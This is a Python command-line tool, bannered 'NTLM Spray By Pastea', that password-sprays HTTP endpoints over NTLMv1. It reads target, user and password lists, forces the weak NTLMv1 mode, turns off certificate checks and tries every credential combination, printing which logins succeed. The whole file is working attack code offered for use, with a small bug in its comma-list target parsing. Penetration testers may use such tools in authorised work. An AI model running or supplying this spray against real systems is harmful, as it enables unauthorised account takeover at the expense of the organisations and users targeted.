import socket
from ntlm_auth import ntlm 
import requests
import argparse
import os

def NTLMv1Auth(url,username,password,domain,workstation,proxies):
  s = requests.Session()

  ntlmAuth = ntlm.Ntlm(ntlm_compatibility=0)
  negotiate_message = ntlmAuth.create_negotiate_message(domain,workstation).decode('ascii')
  negotiate_header = "NTLM %s" % negotiate_message
  s.headers.update({"Authorization":negotiate_header})

  #print("[+]","->",s.headers)

  request = s.get(url,proxies=proxies,verify=False)
  #print("[+]","<-",request.status_code,request.headers)
  challenge_message = ntlmAuth.parse_challenge_message(request.headers['WWW-Authenticate'].split(" ")[1])
  #print(challenge_message)

  authenticate_message = ntlmAuth.create_authenticate_message(username,password,domain,workstation).decode('ascii')
  authenticate_header = "NTLM %s" % authenticate_message
  s.headers.update({"Authorization":authenticate_header})

  #print("[+]","->",s.headers)
  request = s.get(url,proxies=proxies,verify=False)
  #print("[+]","<-",request.status_code,request.headers)

  if ("WWW-Authenticate" in request.headers and request.headers["WWW-Authenticate"]=="Negotiate, NTLM") or request.status_code==401:
    return (False,request.status_code, request.headers["WWW-Authenticate"])
  else:
    return (True,request.status_code)


print("""                                                         
 _____ _____ __    _____   _____                 
|   | |_   _|  |  |     | |   __|___ ___ ___ _ _ 
| | | | | | |  |__| | | | |__   | . |  _| .'| | |
|_|___| |_| |_____|_|_|_|_|_____|  _|_| |__,|_  |
                                |_|         |___| By Pastea

""")

parser = argparse.ArgumentParser( prog="%s" % os.path.basename(__file__),
                  formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),
                  epilog= '''
                   This script peform a password spray on NTLMv1 endpoints.
                  ''')
parser.add_argument("targets", help="Target, target list or file")
parser.add_argument("users", help="User, user list or file")
parser.add_argument("passwords", help="Password")
parser.add_argument("-w", "--workstation", default="WORKSTATIONDISCUTIBILE", help="Workstation")
args = parser.parse_args()

requests.packages.urllib3.disable_warnings()
proxies=None

if os.path.exists(args.targets):
  typeTargets = "file"
  f = open("%s" % args.targets,"r")
  targets = [x.strip() for x in f.readlines()]
  f.close()
elif "," in args.targets:
  typeTargets="list"
  targets = args.target.strip().split(",")
else:
  typeTargets="string"
  targets = [args.targets.strip()]

print("Targets: %s" % ",".join(targets))

if os.path.exists(args.users):
  typeUsers = "file"
  f = open("%s" % args.users,"r")
  users = [x.strip() for x in f.readlines()]
  f.close()
elif "," in args.users:
  typeUsers="list"
  users = args.users.strip().split(",")
else:
  typeUsers="string"
  users = [args.users.strip()]

print("users: %s" % ",".join(users))

if os.path.exists(args.passwords):
  f = open("%s" % args.passwords,"r")
  passwords = [x.strip() for x in f.readlines()]
  f.close()
elif "," in args.passwords:
  passwords = args.passwords.strip().split(",")
else:
  passwords = [args.passwords.strip()]

print("Passwords: %s" % ",".join(passwords))


for password in passwords:
  for target in targets:
    try:
      for user in users:
        if "\\" in user:
          domain,user = user.split("\\")
        else:
          domain=""
        print(user,domain)
        print(target,user,NTLMv1Auth(target,user,password,domain,args.workstation,proxies))
    except Exception as e:
      print(target,e)
      pass


